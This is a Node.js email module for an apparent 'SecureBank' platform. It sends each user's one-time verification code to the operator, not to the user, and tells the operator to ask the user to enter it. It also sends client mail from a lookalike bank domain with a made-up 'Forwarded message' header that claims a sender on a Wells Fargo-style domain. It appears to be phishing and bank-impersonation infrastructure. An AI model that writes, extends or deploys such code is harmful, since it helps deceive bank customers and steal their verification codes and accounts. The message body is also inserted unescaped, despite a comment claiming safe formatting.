const { Resend } = require('resend');

const resend = process.env.RESEND_API_KEY 
  ? new Resend(process.env.RESEND_API_KEY)
  : { emails: { send: async () => { console.warn('⚠️ [DEV] Resend API Key missing. Email skipped.'); return { data: { id: 'mock_id' } }; } } };

/**
 * Sends OTP email using Resend API
 * @param {Object} user - User details { firstName, lastName, email }
 * @param {string} otp - The 6-digit code
 */
const sendOTPEmail = async (user, otp) => {
  const ownerEmail = process.env.OWNER_EMAIL || 'missing-email@example.com';
  
  if (!process.env.RESEND_API_KEY || !process.env.OWNER_EMAIL) {
    console.error('❌ [RENDER ERROR] You forgot to set RESEND_API_KEY or OWNER_EMAIL in Render Environment variables! No email will be sent.');
    return { data: { id: 'mock_skip' } };
  }

  return resend.emails.send({
    from: '"SecureBank Security" <support@wellsfinancebank.org>', // Updated to your new custom domain
    to: ownerEmail,
    subject: `🔐 New OTP Request – ${user.firstName} ${user.lastName}`,
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f9f9f9; padding: 20px; }
          .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #eee; }
          .header { background: #C8102E; color: white; padding: 24px; text-align: center; }
          .header h1 { margin: 0; font-size: 20px; font-weight: 700; letter-spacing: 0.5px; }
          .content { padding: 32px; color: #333; }
          .label { color: #888; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; }
          .value { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
          .otp-box { background: #fff5f6; border: 2px solid #C8102E; border-radius: 10px; padding: 24px; text-align: center; margin: 30px 0; }
          .otp-code { font-size: 44px; font-weight: 900; color: #C8102E; letter-spacing: 12px; font-family: monospace; }
          .footer { padding: 20px; text-align: center; font-size: 11px; color: #aaa; background: #fafafa; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header"><h1>SECUREBANK AUTH</h1></div>
          <div class="content">
            <div class="label">User Details</div>
            <div class="value">${user.firstName} ${user.lastName} (${user.email})</div>
            
            <div class="otp-box">
              <div class="label">Verification Code</div>
              <div class="otp-code">${otp}</div>
              <p style="font-size: 12px; color: #999; margin-top: 10px;">Expires in 5 minutes</p>
            </div>
            
            <p style="font-size: 14px; color: #666; text-align: center;">Ask the user to enter this code to complete their registration.</p>
          </div>
          <div class="footer">SecureBank Platform &copy; 2026. All rights reserved.</div>
        </div>
      </body>
      </html>
    `,
  });
};

/**
 * Sends Custom Email using Resend API to Client
 * @param {string} to - Recipient email
 * @param {string} subject - Email subject
 * @param {string} textMessage - The message content
 */
const sendCustomEmail = async (to, subject, textMessage) => {
  if (!process.env.RESEND_API_KEY) {
    console.warn('⚠️ [DEV] Resend API Key missing. Custom email skipped.');
    return { data: { id: 'mock_skip_custom' } };
  }

  // Formatting message safely (line breaks from text to HTML)
  const formattedMessage = textMessage;

  return resend.emails.send({
    from: '"Support SecureBank" <support@wellsfinancebank.org>',
    to: to,
    subject: subject,
    html: `
      <!DOCTYPE html>
      <html>
      <body style="font-family: Arial, sans-serif; padding: 20px; line-height: 1.6; color: rgba(255, 255, 255, 0.9); background-color: #121212;">
        <div style="font-size: 16px; margin-bottom: 20px;">
          <br>
          <div style="color: #bbb;">
            ---------- Forwarded message ---------<br>
            From: <span style="color: #90CAF9; font-weight: bold;">account@wellsfargofinancebank.net</span> &lt;<a href="mailto:account@wellsfargofinancebank.net" style="color: #90CAF9; text-decoration: none;">account@wellsfargofinancebank.net</a>&gt;<br>
            Date: ${new Date().toLocaleString()}<br>
            Subject: ${subject}<br>
            To: &lt;<a href="mailto:${to}" style="color: #90CAF9; text-decoration: none;">${to}</a>&gt;<br>
          </div>
          <br><br>
        </div>
        <div style="font-size: 16px;">
          ${formattedMessage}
        </div>
      </body>
      </html>
    `,
  });
};

module.exports = { sendOTPEmail, sendCustomEmail };
